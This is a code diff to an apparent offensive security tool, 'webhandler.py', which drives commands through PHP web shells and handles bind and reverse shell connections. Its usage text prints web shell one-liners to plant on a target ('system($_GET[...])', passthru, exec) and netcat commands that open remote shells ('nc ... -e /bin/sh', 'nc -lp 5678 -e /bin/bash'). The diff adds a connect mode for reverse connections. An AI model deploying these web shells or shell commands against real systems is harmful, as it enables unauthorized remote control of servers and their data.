@@ -3,7 +3,7 @@
 '''
 -*- coding: utf-8 -*-
 
-A hanlder for PHP system functions & alternative 'netcat listener'
+A hanlder for PHP 'system functions' & also an alternative 'netcat' hanlder
     - <?php system($_REQUEST['parameter']); ?>
     - netcat -l -p 1234
 
@@ -31,6 +31,7 @@ from platform import platform as OS
 
 from core.libs.executer import commander
 from core.libs.listen_handler import listen
+from core.libs.connect_handler import connect
 from core.libs.menu import getargs
 from core.libs.banner import banner
 from core.libs.update import update
@@ -38,18 +39,31 @@ from core.libs.thirdparty.termcolor import cprint, colored
 
 
 if len(argv) <= 1:
-    cprint("-- Hanlder for PHP system functions & alternative 'netcat listener' --\n", 'blue')
+    cprint("-- Hanlder for PHP 'system functions' & also an alternative 'netcat' hanlder --\n", 'cyan')
     
-    cprint("Example: python webhandler.py --url http://www.mywebsite.com/shell.php?cmd=", 'green')
     cprint("--   Works for POST and GET requests   --", 'blue')
-    cprint("1-   <?php system($_GET['parameter']); ?>", 'yellow')
-    cprint("2-   <?php passthru($_REQUEST['parameter']); ?>", 'yellow')
-    cprint("3-   <?php echo exec($_POST['parameter']); ?>\n", 'yellow')
+    cprint(" Target's side:", 'green')
+    cprint("-   <?php system($_GET['parameter']); ?>", 'yellow')
+    cprint("-   <?php passthru($_REQUEST['parameter']); ?>", 'yellow')
+    cprint("-   <?php echo exec($_POST['parameter']); ?>", 'yellow')
+    cprint(" Example command:", 'green')    
+    cprint("-   python webhandler.py --url http://www.mywebsite.com/shell.php?cmd=\n", 'yellow')    
     
-    cprint("Example: python webhandler.py --listen 1234", 'green')
-    cprint("--   Alternative 'netcat listener'   --", 'blue')
-    cprint("1-   netcat -l -p 1234", 'yellow')
-    cprint("2-   nc -lvvp 4321\n", 'yellow')
+    cprint("--  Listening server (for an bind connection)   --", 'blue')
+    cprint(" Example command:", 'green')    
+    cprint("-   WebHandler: python webhandler.py --listen 1234", 'yellow')    
+    cprint("-       netcat: nc -lp 1234", 'yellow')   
+    cprint(" Target's side:", 'green')    
+    cprint("-       nc mywebsite.com:1234 -e /bin/sh\n", 'yellow')   
+    # More examples: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+        
+    cprint("--   Connecting client (for an reverse connection)   --", 'blue')
+    cprint(" Target's side:", 'green')
+    cprint("-   nc -lp 5678 -e /bin/bash", 'yellow')
+    cprint(" Example command:", 'green')    
+    cprint("-   WebHandler: python webhandler.py --connect mywebsite.com:5678", 'yellow')    
+    cprint("-       netcat: nc mywebsite.com:5678\n", 'yellow') 
+    
     print "Run: " + colored("{0} -h".format(argv[0]), 'red') + " for help & more example commands"
     exit(1)
 
@@ -66,12 +80,15 @@ else:
             print banner                                            # Print the banner
             commander.BackConnect()                                 # Call BackConnect method to handle input
 
-    elif getargs.listen:
+    elif getargs.listen or getargs.connect:
         if 'windows' in OS().lower():
             errmsg = '[!] WebHandler doesn\'t support Windows yet, still working on it.'
             exit(cprint(errmsg, 'red'))
-        else:
+        if getargs.listen:
             listen.wait_connection()                                # Call wait_connection to wait for a connection
+            commander.BackConnect()                                 # Call BackConnect method to handle input
+        else:
+            connect.create_connection()                             # Call create_connection to try and connect to the target
             commander.BackConnect()                                 # Call BackConnect method to handle input
 
     elif getargs.update:
